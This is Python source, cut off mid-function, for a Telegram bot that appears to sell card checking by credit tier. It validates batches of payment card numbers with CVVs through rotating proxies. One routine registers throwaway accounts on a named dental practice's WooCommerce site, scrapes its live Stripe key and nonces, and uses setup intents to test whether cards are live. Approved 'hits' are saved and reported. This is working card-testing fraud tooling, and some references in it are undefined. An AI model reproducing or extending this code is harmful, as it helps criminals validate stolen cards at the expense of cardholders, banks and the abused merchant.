def format_st1_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str, str]:
    """Format ST1 (Torr.ie) response for display with PREMIUM EMOJIS"""
    bin_info_text, bank, country, currency_code, country_code = bin_info
    
    status_display = result.get("status_display", "⚠️ UNKNOWN")
    status_category = result.get("status_category", "unknown")
    response_msg = result.get("message", "Unknown")
    price = result.get("price", "$0.50")
    elapsed = result.get("elapsed", 0)
    gateway = result.get("gateway", "ST1 Auth")
    
    # ============ CHECK FOR INSUFFICIENT FUNDS IN RESPONSE ============
    response_upper = response_msg.upper()
    
    # Override status based on actual response message
    if "INSUFFICIENT FUNDS" in response_upper:
        status_display = "💰 INSUFFICIENT FUNDS"
        status_category = "approved"
        print(f"💰 [ST1] Insufficient funds detected - Card is LIVE!")
    elif "DECLINED" in response_upper and "INSUFFICIENT" not in response_upper:
        status_display = "❌ DECLINED"
        status_category = "declined"
    elif "3D" in response_upper or "SECURE" in response_upper or "AUTHENTICATION" in response_upper:
        status_display = "🔐 3D REQUIRED"
        status_category = "approved"
    elif "CVV" in response_upper or "SECURITY CODE" in response_upper:
        status_display = "✅ CVV LIVE"
        status_category = "approved"

    elif "SUCCESS" in response_upper:
        status_display = "🔥 CHARGED "
        status_category = "charged"
    
    # Parse card for display
    card_parts = card.split('|')
    card_num = card_parts[0] if len(card_parts) > 0 else card
    exp_month = card_parts[1] if len(card_parts) > 1 else "XX"
    exp_year = card_parts[2] if len(card_parts) > 2 else "XX"
    exp_year_short = exp_year[-2:] if len(exp_year) == 4 else exp_year
    cvv = card_parts[3] if len(card_parts) > 3 else "XXX"
    
    # Clean response message
    clean_response = response_msg[:100]
    
    # Format country with flag
    country_name = country.replace('🌐', '').strip()
    flag_map = {
        'USA': '🇺🇸', 'UNITED STATES': '🇺🇸', 'UK': '🇬🇧', 'CANADA': '🇨🇦',
        'AUSTRALIA': '🇦🇺', 'INDIA': '🇮🇳', 'UAE': '🇦🇪', 'GERMANY': '🇩🇪',
        'FRANCE': '🇫🇷', 'SPAIN': '🇪🇸', 'ITALY': '🇮🇹', 'NETHERLANDS': '🇳🇱'
    }
    country_flag = "🌍"
    for key, flag in flag_map.items():
        if key in country_name.upper():
            country_flag = flag
            break
    
    # Format bank name
    bank_display = bank if bank != 'N/A' else "Unknown"
    if len(bank_display) > 25:
        bank_display = bank_display[:22] + "..."
    
    # Get premium emoji based on final status
    if "INSUFFICIENT FUNDS" in status_display:
        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["money"], "💰")
        status_text = "INSUFFICIENT FUNDS"
    elif "CHARGED" in status_display:
        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
        status_text = "CHARGED"
    elif "3D" in status_display:
        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["lock"], "🔐")
        status_text = "3D REQUIRED"
    elif "CVV LIVE" in status_display:
        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
        status_text = "CVV LIVE"
    elif "APPROVED" in status_display:
        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
        status_text = "APPROVED"
    else:
        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
        status_text = "DECLINED"
    
    # Build output with Premium Emojis
    ui = (
        f"┏━━━━━━━⍟\n"
        f"┃ {status_emoji} {status_text}\n"
        f"┗━━━━━━━━━━━⊛\n\n"
        f"⌬ 𝐂𝐚𝐫𝐝 ↣ <code>{card_num}|{exp_month}|{exp_year_short}|{cvv}</code>\n"
        f"⌬ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ Strip Charged\n"
        f"⌬ 𝐀𝐦𝐨𝐮𝐧𝐭 ↣ {price}\n"
        f"⌬ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {clean_response}\n"
        f"⌬ 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
        f"⌬ 𝐁𝐚𝐧𝐤 ↣ {bank_display}\n"
        f"⌬ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country_name}\n"
        f"⌬ 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
    )
    
    return ui, status_category

@check_gateway("st1")
async def single_check_st1(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Single card check with Torr.ie Auth Gateway - /st1 <card>"""
    if not await verify_group_access(update, context):
        return
    
    if not context.args:
        await update.message.reply_text(
            "💳 <b>ST1 Auth Gateway (Torr.ie)</b>\n\n"
            "Usage: <code>/st1 &lt;card&gt;</code>\n"
            "Example: <code>/st1 4111111111111111|12|2028|123</code>\n\n"
            "💰 Amount: $0.50 (Authorization only)\n"
            "📍 Gateway: Torr.ie Auth\n"
            "✅ Tests if card is LIVE/valid\n"
            "🔐 Checks for CVV, 3D Secure, Insufficient Funds",
            parse_mode=ParseMode.HTML
        )
        return
    
    user_id = update.effective_user.id
    message = update.effective_message
    card_text = " ".join(context.args).strip()
    
    # Extract card
    card = card_formatter.extract_single_card_from_text(card_text)
    if not card:
        await message.reply_text(
            "❌ Invalid card format. Use: NUMBER|MM|YYYY|CVV\n"
            "Example: 4111111111111111|12|2028|123"
        )
        return
    
    # Check credits first
    can_proceed, error_msg = await check_and_deduct_credits(user_id, update, context, is_mass_check=False, card_count=1)
    if not can_proceed:
        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
        return
    
    # Check gateway access
    if not user_manager.can_access_gateway(user_id, 'stripe_auth'):  # Using stripe_auth access
        tier = user_manager.get_tier(user_id)
        await message.reply_text(
            f"USE /buy TO UPGRADE YOUR TIER 💎\n"
            
        )
        await message.reply_text(error_message, parse_mode=ParseMode.HTML)
        add_user_credits(u_id, 1)
        return
    
    st1_active_tasks[user_id] = True
    
    try:
        tier = user_manager.get_tier(user_id)
        if user_id not in user_speed_controllers:
            user_speed_controllers[user_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[user_id]
        
        status_msg = await message.reply_text("🔄 Checking ...")
        
        await speed_controller.wait_if_needed()
        start = time.time()
        
        # Get proxy if allowed
        proxy_str = None
        if user_manager.can_use_proxy(user_id):
            if user_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[user_id]:
                proxy_list = autosopi_proxy_tracker.working_proxies[user_id]
                if proxy_list:
                    proxy_str = proxy_list[0]
                    print(f"🔌 Using proxy: {mask_proxy(proxy_str)}")
        
        # Check card
        result = await check_card_st1(card, proxy_str, user_id)
        
        elapsed = time.time() - start
        speed_controller.record_response(elapsed)
        
        # Get BIN info
        bin_info = await get_bin_info(card)
        
        # Delete checking message
        try:
            await status_msg.delete()
        except:
            pass
        
        # Format and send result
        ui, status_category = format_st1_response(result, card, bin_info)
        await message.reply_text(ui, parse_mode=ParseMode.HTML)
        
        # Save hit if approved
        if status_category == "approved":
            await save_hit_to_file(
                card=card, gateway="ST1 Auth",
                response=result.get("message", "Approved"),
                price="$0.50",
                bin_info=bin_info, user_id=user_id, user_tier=tier
            )
            
            user_data = user_manager.get_user(user_id)
            await send_hit_notification(
                context=context, gateway="ST1 Auth", card=card,
                response=result.get("message", "Approved"),
                price="$0.50",
                user=user_data, bin_info=bin_info, status_category="approved"
            )
            user_manager.increment_hits(user_id)
        
        user_manager.increment_checks(user_id)
        
        # Show remaining credits for free users
        if user_manager.get_tier(user_id) == 'free':
            remaining = get_user_credits(user_id)
            await message.reply_text(
                f"💎 <b>Credits Remaining: {remaining}</b>\n"
                f"Use /credits to check balance.",
                parse_mode=ParseMode.HTML
            )
        
    except Exception as e:
        try:
            await status_msg.delete()
        except:
            pass
        await message.reply_text(f"❌ Error: {str(e)[:100]}")
        print(f"❌ [ST1] Error: {traceback.format_exc()}")
        add_user_credits(user_id, 1)  # Refund credit on error
    finally:
        st1_active_tasks.pop(user_id, None)

@check_gateway("st1")
async def mass_check_st1_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, progress_msg=None):
    """Mass check logic for ST1 (Torr.ie) gateway"""
    u_id = update.effective_user.id
    message = update.effective_message
    total = len(cards)
    
    print(f"\n{'='*80}")
    print(f"🚀 [ST1 MASS CHECK] Starting batch for user {u_id}")
    print(f"📊 Total cards: {total}")
    print(f"{'='*80}")
    
    stats = {
        "approved": 0,
        "declined": 0,
        "errors": 0,
        "total": total,
        "processed": 0
    }
    
    start_time = time.time()
    
    try:
        st1_active_tasks[u_id] = True
        
        tier = user_manager.get_tier(u_id)
        
        # Concurrency based on tier
        CONCURRENCY = {
            "free": 2,
            "premium": 5,
            "ultimate": 3,
            "admin": 2,
        }.get(tier, 2)
        
        # Create initial progress message
        if progress_msg is None:
            approved_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
            dead_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
            errors_emoji = premium_emoji(PREMIUM_EMOJI_IDS["error"], "⚠️")
            
            initial_text = (
                f"<b>Gateway</b> ➛ ST1 Auth (Torr.ie)\n"
                f"<b>Status</b> ➛ STARTING...\n"
                f"<b>Checked</b> ➛ 0/{total}\n"
                f"<b>Approved</b> ➛ 0 {approved_emoji}\n"
                f"<b>Dead</b> ➛ 0 {dead_emoji}\n"
                f"<b>Errors</b> ➛ 0 {errors_emoji}\n"
                f"<b>Time</b> ➛ 0s"
            )
            
            progress_msg = await message.reply_text(initial_text, parse_mode=ParseMode.HTML)
        
        if u_id not in user_speed_controllers:
            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[u_id]
        
        semaphore = asyncio.Semaphore(CONCURRENCY)
        stats_lock = asyncio.Lock()
        processed = 0
        
        async def update_progress(current: int):
            """Update progress message"""
            if current > 0 and current < total and current % 10 != 0:
                return
            elapsed = int(time.time() - start_time)
            minutes = elapsed // 60
            seconds = elapsed % 60
            time_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"
            
            approved_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
            dead_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
            errors_emoji = premium_emoji(PREMIUM_EMOJI_IDS["error"], "⚠️")
            
            if current >= total:
                status_text = "FINISHED ✅"
            else:
                status_text = f"PROCESSING {current}/{total}"
            
            progress_text = (
                f"<b>Gateway</b> ➛ ST1 Auth \n"
                f"<b>Status</b> ➛ {status_text}\n"
                f"<b>Checked</b> ➛ {current}/{total}\n"
                f"<b>Approved</b> ➛ {stats['approved']} {approved_emoji}\n"
                f"<b>Dead</b> ➛ {stats['declined']} {dead_emoji}\n"
                f"<b>Errors</b> ➛ {stats['errors']} {errors_emoji}\n"
                f"<b>Time</b> ➛ {time_str}"
            )
            
            try:
                await progress_msg.edit_text(progress_text, parse_mode=ParseMode.HTML)
            except Exception as e:
                if "message is not modified" not in str(e).lower():
                    print(f"⚠️ Progress update error: {e}")
        
        async def process_card(card: str, idx: int):
            nonlocal processed
            async with semaphore:
                await speed_controller.wait_if_needed()
                start = time.time()
                
                # Get proxy if allowed
                proxy_str = None
                if user_manager.can_use_proxy(u_id):
                    if u_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[u_id]:
                        proxy_list = autosopi_proxy_tracker.working_proxies[u_id]
                        if proxy_list:
                            proxy_index = idx % len(proxy_list)
                            proxy_str = proxy_list[proxy_index]
                
                result = await check_card_st1(card, proxy_str, u_id)
                elapsed = time.time() - start
                speed_controller.record_response(elapsed)
                
                bin_info = await get_bin_info(card)
                
                async with stats_lock:
                    processed += 1
                    
                    status_category = result.get("status_category", "unknown")
                    
                    if status_category == "approved":
                        stats["approved"] += 1
                    elif status_category == "declined":
                        stats["declined"] += 1
                    else:
                        stats["errors"] += 1
                    
                    if processed % 10 == 0 or processed == total:
                        await update_progress(processed)
                
                # Send result for approved cards
                if status_category == "approved":
                    ui, _ = format_st1_response(result, card, bin_info)
                    try:
                        await message.reply_text(ui, parse_mode=ParseMode.HTML)
                    except Exception as e:
                        print(f"❌ Error sending result: {e}")
                    
                    # Save hit to file
                    await save_hit_to_file(
                        card=card, gateway="ST1 Auth",
                        response=result.get("message", "Approved"),
                        price="$0.50",
                        bin_info=bin_info, user_id=u_id, user_tier=tier
                    )
                    
                    # Send notification
                    user_data = user_manager.get_user(u_id)
                    await send_hit_notification(
                        context=context, gateway="ST1 Auth", card=card,
                        response=result.get("message", "Approved"),
                        price="$0.50",
                        user=user_data, bin_info=bin_info, status_category="approved"
                    )
                    user_manager.increment_hits(u_id)
                
                user_manager.increment_checks(u_id, 1)
                return result, card
        
        # Process all cards
        tasks = [process_card(card, idx) for idx, card in enumerate(cards)]
        
        for coro in asyncio.as_completed(tasks):
            if u_id not in st1_active_tasks:
                break
            try:
                await coro
            except Exception as e:
                print(f"❌ Task error: {e}")
                async with stats_lock:
                    stats["errors"] += 1
        
        # Final summary
        if u_id in st1_active_tasks:
            total_time = time.time() - start_time
            minutes = int(total_time // 60)
            seconds = int(total_time % 60)
            
            approved_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
            declined_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
            errors_emoji = premium_emoji(PREMIUM_EMOJI_IDS["error"], "⚠️")
            total_emoji = premium_emoji(PREMIUM_EMOJI_IDS["stats"], "📝")
            time_emoji = premium_emoji(PREMIUM_EMOJI_IDS["time"], "⏱️")
            skull_emoji = premium_emoji(PREMIUM_EMOJI_IDS["skull"], "💀")
            
            summary = (
                f"{skull_emoji} <b>ST1 Mass Check Complete</b>\n\n"
                f"{approved_emoji} <b>Approved</b> ➛ {stats['approved']}\n"
                f"{declined_emoji} <b>Declined</b> ➛ {stats['declined']}\n"
                f"{errors_emoji} <b>Errors</b> ➛ {stats['errors']}\n"
                f"{total_emoji} <b>Total</b> ➛ {total}\n"
                f"{time_emoji} <b>Time</b> ➛ {minutes}m {seconds}s\n"
                f"{skull_emoji} <b>Bot</b> ➛ @BLADESARKS_V3bot"
            )
            
            await update_progress(total)
            await message.reply_text(summary, parse_mode=ParseMode.HTML)
            
    except Exception as e:
        print(f"❌ ST1 mass check error: {e}")
        traceback.print_exc()
        try:
            if progress_msg:
                await progress_msg.edit_text(f"❌ Error: {str(e)[:100]}")
            else:
                await message.reply_text(f"❌ Error: {str(e)[:100]}")
        except:
            pass
    finally:
        st1_active_tasks.pop(u_id, None)
        print(f"🏁 [ST1 Mass] Session ended for user {u_id}")


async def mass_check_st1_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass card check with ST1 Auth Gateway - /mst1 <cards> or reply to file"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    message = update.effective_message
    
    # Check if user already has an active session
    if user_id in st1_active_tasks:
        await message.reply_text(
            "⚠️ You already have an active ST1 session.\n"
            "Please wait for it to finish or use /stop to cancel.",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check gateway access
    if not user_manager.can_access_gateway(user_id, 'stripe_auth'):
        tier = user_manager.get_tier(user_id)
        await message.reply_text(
            f" USE /buy TO UPGRADE YOUR TIER 💎\n"
            
        )
        await message.reply_text(error_message, parse_mode=ParseMode.HTML)
        add_user_credits(u_id, 1)
        return
    
    # Check if user can mass check
    if not user_manager.can_mass_check(user_id):
        tier = user_manager.get_tier(user_id)
        await message.reply_text(
            f"❌ <b>Mass Check Not Available for {tier.upper()} Tier</b>\n\n"
            f"Use <code>/st1 &lt;card&gt;</code> for single checks.\n\n"
            f"💎 Upgrade to Premium/Ultimate for mass checks.",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check if reply to file
    if message.reply_to_message and message.reply_to_message.document:
        try:
            file = await message.reply_to_message.document.get_file()
            content = await file.download_as_bytearray()
            content = content.decode('utf-8', errors='ignore')
            
            cards = []
            for line in content.splitlines():
                line = line.strip()
                if line and not line.startswith('#'):
                    card = card_formatter.extract_single_card_from_text(line)
                    if card:
                        cards.append(card)
            
            if not cards:
                await message.reply_text("❌ No valid cards found in file.")
                return
                
            # Delete command message
            try:
                await message.delete()
            except:
                pass
            
            await mass_check_st1_logic(update, context, cards, None)
            return
            
        except Exception as e:
            await message.reply_text(f"❌ Error reading file: {str(e)[:100]}")
            return
    
    # Handle direct text input
    if not context.args:
        await message.reply_text(
            "📦 <b>ST1 Mass Check (Torr.ie Auth)</b>\n\n"
            "Usage: <code>/mst1 &lt;card1&gt; &lt;card2&gt; ...</code>\n"
            "Or reply to a .txt file with /mst1\n\n"
            "Example: <code>/mst1 4111111111111111|12|2028|123 4222222222222222|11|2026|456</code>\n\n"
            "💰 Amount: $0.50 (Authorization only)\n"
            "📍 Gateway: Torr.ie Auth\n"
            "✅ Tests if cards are LIVE/valid\n"
            "📊 Only approved cards will be shown",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Extract cards
    cards_text = " ".join(context.args)
    card_strings = cards_text.split()
    
    cards = []
    for card_str in card_strings:
        card = card_formatter.extract_single_card_from_text(card_str)
        if card:
            cards.append(card)
    
    if not cards:
        await message.reply_text("❌ No valid cards found.")
        return
    
    # Check batch size limit
    max_batch = user_manager.get_max_batch_size(user_id)
    if len(cards) > max_batch:
        cards = cards[:max_batch]
        await message.reply_text(f"USE /buy TO UPGRADE")
    
    # Check credits for mass check
    can_proceed, error_msg = await check_and_deduct_mass_credits(user_id, update, context, len(cards))
    if not can_proceed:
        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
        return
    
    # Delete command message
    try:
        await message.delete()
    except:
        pass
    
    await mass_check_st1_logic(update, context, cards, None)
    
    
# ============ STRIPE AUTH GATEWAY FROM stripe(2).py ============
# Add this after your other gateway configurations

STRIPE_AUTH_SITE = "https://www.marinadentistry.com"

async def check_card_stripe_auth_v2(card: str, proxy: str = None) -> Dict:
    """
    Check card using Stripe Auth gateway via marinadentistry.com
    Based on the Tele() function from stripe(2).py
    """
    print(f"\n{'='*80}")
    print(f"💳 [STRIPE AUTH V2] Checking card: {card[:20]}...")
    if proxy:
        print(f"🔌 Using proxy: {mask_proxy(proxy)}")
    print(f"{'='*80}")
    
    default_result = {
        "status": "error",
        "result": "UNKNOWN_ERROR",
        "message": "Unknown error occurred",
        "status_display": "⚠️ ERROR",
        "status_category": "error",
        "elapsed": 0,
        "price": "$0.00",
        "gateway": "Stripe Auth"
    }
    
    try:
        # Parse card
        parts = card.split('|')
        if len(parts) != 4:
            return {
                "status": "error",
                "result": "INVALID_FORMAT",
                "message": "Invalid card format. Use: NUMBER|MM|YYYY|CVV",
                "status_display": "⚠️ INVALID FORMAT",
                "status_category": "error"
            }
        
        n, mm, yy, cvc = parts
        mm = mm.zfill(2)
        
        # Format year to 2 digits
        if len(yy) == 4:
            yy = yy[-2:]
        elif "20" in yy:
            yy = yy.replace("20", "")[-2:]
        
        start_time = time.time()
        
        # Create session and get user agent
        user = generate_user_agent()
        r = requests.Session()
        headers = {'user-agent': user}
        
        # Add proxy if provided
        if proxy:
            proxy_url = format_proxy(proxy)
            if proxy_url:
                r.proxies = {'http': proxy_url, 'https': proxy_url}
                print(f"🔌 Using proxy: {mask_proxy(proxy_url)}")
        
        # Step 1: Get registration nonce from my-account page
        res = r.get(url=f"{STRIPE_AUTH_SITE}/my-account/", headers=headers, timeout=30).text
        reg2 = re.search('name="woocommerce-register-nonce" value="(.*?)"', res)
        
        if not reg2:
            default_result["message"] = "Page not found - could not extract nonce"
            return default_result
        
        reg = reg2.group(1)
        
        # Step 2: Register new account
        username = f'u_{uuid.uuid4().hex[:8]}'
        email = f'u_{uuid.uuid4().hex[:8]}@gmail.com'
        password = f'P_{uuid.uuid4().hex[:8]}!'
        
        data = {
            'username': username,
            'email': email,
            'password': password,
            'woocommerce-register-nonce': reg,
            'register': 'Register'
        }
        
        res2 = r.post(url=f"{STRIPE_AUTH_SITE}/my-account/", headers=headers, data=data, timeout=30).text
        
        # Step 3: Get add-payment-method page to extract Stripe keys
        res3 = r.get(url=f"{STRIPE_AUTH_SITE}/my-account/add-payment-method/", headers=headers, timeout=30)
        
        # Extract publishable key
        pk_live2 = re.search(r'(pk_live_[A-Za-z0-9_-]+)', res3.text)
        if not pk_live2:
            default_result["message"] = "Registration failed or page not found"
            return default_result
        
        pk_live = pk_live2.group(1)
        
        # Extract account ID
        acct2 = re.search(r'(acct_[A-Za-z0-9_-]+)', res3.text)
        acct = f'&_stripe_account={acct2.group(1)}' if acct2 else ''
        
        # Extract nonce for setup intent
        addnonce2 = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', res3.text)
        addnonce3 = re.search(r'"createSetupIntentNonce":"(.*?)"', res3.text)
        
        if addnonce2:
            addnonce = addnonce2.group(1)
        elif addnonce3:
            addnonce = addnonce3.group(1)
        else:
            default_result["message"] = "The add key was not found"
            return default_result
        
        # Step 4: Create payment method with Stripe API
        headers_stripe = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': user
        }
        
        data_stripe = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2F6c35f76878%3B+stripe-js-v3%2F6c35f76878%3B+payment-element%3B+deferred-intent&key={pk_live}{acct}'
        
        res4 = r.post('https://api.stripe.com/v1/payment_methods', data=data_stripe, headers=headers_stripe, timeout=30)
        pm_data = res4.json()
        
        if 'id' not in pm_data:
            elapsed = time.time() - start_time
            error_msg = pm_data.get('error', {}).get('message', 'No payment method ID')
            return {
                "status": "declined",
                "result": "PM_CREATION_FAILED",
                "message": error_msg,
                "status_display": "❌ DECLINED",
                "status_category": "declined",
                "elapsed": elapsed,
                "price": "$0.00",
                "gateway": "Stripe Auth"
            }
        
        payment_id = pm_data['id']
        
        # Step 5: Confirm setup intent
        final_headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': f'{STRIPE_AUTH_SITE}/my-account/add-payment-method/',
            'Origin': STRIPE_AUTH_SITE,
            'user-agent': user
        }
        
        data_final = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': addnonce
        }
        
        r5r = r.post(f'{STRIPE_AUTH_SITE}/wp-admin/admin-ajax.php', data=data_final, headers=final_headers, timeout=30)
        r5 = r5r.text
        elapsed = time.time() - start_time
        
        # Parse response
        r5_upper = r5.upper()
        
        if 'Your card was declined.' in r5 or 'Your card could not be set up for future usage.' in r5:
            return {
                "status": "declined",
                "result": "DECLINED",
                "message": "Your card was declined.",
                "status_display": "❌ DECLINED",
                "status_category": "declined",
                "elapsed": elapsed,
                "price": "$0.00",
                "gateway": "Stripe Auth"
            }
        elif 'success' in r5.lower():
            # Check for specific success messages
            if 'New Payment Method Added Successfully' in r5:
                return {
                    "status": "success",
                    "result": "NEW_PAYMENT_METHOD_ADDED",
                    "message": "New Payment Method Added Successfully",
                    "status_display": "✅ NEW PAYMENT METHOD ADDED",
                    "status_category": "approved",
                    "elapsed": elapsed,
                    "price": "$0.00",
                    "gateway": "Stripe Auth"
                }
            else:
                return {
                    "status": "success",
                    "result": "APPROVED",
                    "message": "Card approved successfully",
                    "status_display": "✅ APPROVED",
                    "status_category": "approved",
                    "elapsed": elapsed,
                    "price": "$0.00",
                    "gateway": "Stripe Auth"
                }
        elif 'Your card number is incorrect.' in r5:
            return {
                "status": "declined",
                "result": "INCORRECT_NUMBER",
                "message": "Your card number is incorrect.",
                "status_display": "❌ INCORRECT NUMBER",
                "status_category": "declined",
                "elapsed": elapsed,
                "price": "$0.00",
                "gateway": "Stripe Auth"
            }
        else:
            # Try to extract error message from JSON
            try:
                error_data = r5r.json()
                error_msg = error_data.get('data', {}).get('error', {}).get('message', r5[:200])
            except:
                error_msg = r5[:200] if r5 else "Unknown error"
            
            return {
                "status": "declined",
                "result": "DECLINED",
                "message": error_msg,
                "status_display": "❌ DECLINED",
                "status_category": "declined",
                "elapsed": elapsed,
                "price": "$0.00",
                "gateway": "Stripe Auth"
            }
            
    except requests.Timeout:
        elapsed = time.time() - start_time if 'start_time' in locals() else 0
        return {
            "status": "error",
            "result": "TIMEOUT",
            "message": "Request timeout",
            "status_display": "⚠️ TIMEOUT",
            "status_category": "error",
            "elapsed": elapsed,
            "price": "$0.00",
            "gateway": "Stripe Auth"
        }
    except Exception as e:
        elapsed = time.time() - start_time if 'start_time' in locals() else 0
        print(f"❌ Stripe Auth V2 error: {e}")
        return {
            "status": "error",
            "result": "ERROR",
            "message": str(e)[:100],
            "status_display": "⚠️ ERROR",
            "status_category": "error",
            "elapsed": elapsed,
            "price": "$0.00",
            "gateway": "Stripe Auth"
        }


def format_stripe_auth_v2_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str, str]:
    """Format Stripe Auth V2 response for display"""
    bin_info_text, bank, country, currency_code, country_code = bin_info
    
    status_display = result.get("status_display", "⚠️ UNKNOWN")
    status_category = result.get("status_category", "unknown")
    message = result.get("message", "Unknown")
    elapsed = result.get("elapsed", 0)
    gateway = result.get("gateway", "Stripe Auth")
    
    # Parse card for display
    card_parts = card.split('|')
    card_num = card_parts[0] if len(card_parts) > 0 else card
    exp_month = card_parts[1] if len(card_parts) > 1 else "XX"
    exp_year = card_parts[2] if len(card_parts) > 2 else "XX"
    cvv = card_parts[3] if len(card_parts) > 3 else "XXX"
    
    # Clean response
    clean_message = message[:100]
    
    ui = (
        f"┏━━━━━━━⍟\n"
        f"┃ {status_display}\n"
        f"┗━━━━━━━━━━━⊛\n\n"
        f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card_num}|{exp_month}|{exp_year}|{cvv}</code>\n"
        f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ {gateway}\n"
        f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {clean_message}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"[⌬] 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
        f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank}\n"
        f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country}\n"
        f"[⌬] 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
    )
    
    return ui, status_category


# ============ STRIPE AUTH V2 SINGLE CHECK ============
async def single_check_stripe_auth_v2(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Single card check with Stripe Auth V2 gateway - /chk1 <card>"""
    if not await verify_group_access(update, context):
        return
    
    if not context.args:
        await update.message.reply_text(
            "💳 <b>Stripe Auth V2 Single Check</b>\n\n"
            "Usage: <code>/chk1 &lt;card&gt;</code>\n"
            "Example: <code>/chk1 4242424242424242|12|2028|123</code>\n\n"
            "💰 Amount: $0.00 (Authorization only)\n"
            "📍 Gateway: Stripe Auth via marinadentistry.com\n"
            "✅ Adds payment method to account\n"
            "🔐 Tests if card is valid/live",
            parse_mode=ParseMode.HTML
        )
        return
    
    user_id = update.effective_user.id
    message = update.effective_message
    card_text = " ".join(context.args).strip()
    
    # Extract card
    card = card_formatter.extract_single_card_from_text(card_text)
    if not card:
        await message.reply_text(
            "❌ Invalid card format. Use: NUMBER|MM|YYYY|CVV\n"
            "Example: 4242424242424242|12|2028|123"
        )
        return
    
    # Check credits first
    can_proceed, error_msg = await check_and_deduct_credits(user_id, update, context, is_mass_check=False, card_count=1)
    if not can_proceed:
        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
        return
    
    checking_msg = await message.reply_text(
        f"{premium_emoji(PREMIUM_EMOJI_IDS['time'], '🔄')} Checking card with Stripe Auth...",
        parse_mode=ParseMode.HTML
    )
    
    try:
        tier = user_manager.get_tier(user_id)
        
        # Get proxy if allowed
        proxy_str = None
        if user_manager.can_use_proxy(user_id):
            if user_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[user_id]:
                proxy_str = autosopi_proxy_tracker.working_proxies[user_id][0]
        
        # Make the API call
        result = await check_card_stripe_auth_v2(card, proxy_str)
        
        # Get BIN info
        bin_info = await get_bin_info(card)
        
        # Format response
        ui, status_category = format_stripe_auth_v2_response(result, card, bin_info)
        
        # Delete checking message
        try:
            await checking_msg.delete()
        except:
            pass
        
        # Send result
        await message.reply_text(ui, parse_mode=ParseMode.HTML)
        
        # Save hit if approved
        if status_category == "approved":
            await save_hit_to_file(
                card=card,
                gateway="Stripe Auth V2",
                response=result.get("message", "Approved"),
                price="$0.00",
                bin_info=bin_info,
                user_id=user_id,
                user_tier=tier
            )
            
            user_data = user_manager.get_user(user_id)
            await send_hit_notification(
                context=context,
                gateway="Stripe Auth",
                card=card,
                response=result.get("message", "Approved"),
                price="$0.00",
                user=user_data,
                bin_info=bin_info,
                status_category="approved"
            )
            
            user_manager.increment_hits(user_id)
        
        user_manager.increment_checks(user_id)
        
        # Show remaining credits for free users
        if user_manager.get_tier(user_id) == 'free':
            remaining = get_user_credits(user_id)
            await message.reply_text(
                f"💎 <b>Credits Remaining: {remaining}</b>\n"
                f"Use /credits to check balance.",
                parse_mode=ParseMode.HTML
            )
        
    except Exception as e:
        try:
            await checking_msg.delete()
        except:
            pass
        await message.reply_text(f"❌ Error: {str(e)[:100]}")
        print(f"❌ [Stripe Auth V2] Error: {traceback.format_exc()}")
        add_user_credits(user_id, 1)  # Refund credit on error


# ============ STRIPE AUTH V2 MASS CHECK LOGIC ============
async def stripe_auth_v2_mass_check_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, progress_msg=None):
